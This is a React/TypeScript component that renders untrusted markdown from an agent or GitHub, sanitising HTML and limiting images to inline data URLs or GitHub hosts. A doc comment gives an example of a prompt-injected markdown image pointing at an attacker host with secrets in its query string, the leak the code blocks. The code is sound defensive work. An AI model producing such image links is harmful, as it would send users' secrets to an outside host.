import { type ComponentProps, memo } from "react";
import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";
import remarkGfm from "remark-gfm";

/** Where text written on GitHub may load images from. The page's CSP allows the same hosts. */
const GITHUB_IMAGE_PREFIXES = [
	"https://avatars.githubusercontent.com/",
	"https://github.com/user-attachments/",
	"https://private-user-images.githubusercontent.com/",
	"https://user-images.githubusercontent.com/",
];

const INLINE_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i;

const inlineImage = (src: string): boolean => INLINE_IMAGE.test(src);
const githubImage = (src: string): boolean => inlineImage(src) || GITHUB_IMAGE_PREFIXES.some(prefix => src.startsWith(prefix));

/**
 * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
 * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead.
 */
const imageFrom =
	(allowed: (src: string) => boolean): Components["img"] =>
	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
		const { src, alt } = props;
		if (typeof src !== "string" || src === "") return <>{alt}</>;
		if (allowed(src)) return <img {...props} />;
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{alt || src}
			</a>
		);
	};

const link: Components["a"] = ({ children, node: _node, ...props }) => (
	<a {...props} target="_blank" rel="noopener noreferrer">
		{children}
	</a>
);

const AGENT_COMPONENTS: Components = { a: link, img: imageFrom(inlineImage) };
const GITHUB_COMPONENTS: Components = { a: link, img: imageFrom(githubImage) };

const AGENT_PLUGINS = [rehypeHighlight];
const GITHUB_PLUGINS = [rehypeRaw, rehypeSanitize, rehypeHighlight];
const REMARK_PLUGINS = [remarkGfm];

/** react-markdown drops `data:` URLs; the images the page allows inline are the exception. */
const urlTransform = (url: string, key: string): string => (key === "src" && inlineImage(url) ? url : defaultUrlTransform(url));

/**
 * Markdown text is untrusted. react-markdown escapes raw HTML and filters unsafe link schemes. Images load only inline
 * (`data:`), or, for `github`, from GitHub's own hosts. `github`: text written on GitHub, whose raw HTML renders as
 * GitHub renders it, through rehype-sanitize's schema, which follows GitHub's; HTML comments drop out, as GitHub hides them.
 *
 * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice.
 */
export const MessageMarkdown = memo(function MessageMarkdown({ text, github = false }: { text: string; github?: boolean }) {
	return (
		<div className="message-markdown whitespace-normal break-words">
			<ReactMarkdown
				remarkPlugins={REMARK_PLUGINS}
				rehypePlugins={github ? GITHUB_PLUGINS : AGENT_PLUGINS}
				components={github ? GITHUB_COMPONENTS : AGENT_COMPONENTS}
				urlTransform={urlTransform}
			>
				{text}
			</ReactMarkdown>
		</div>
	);
});
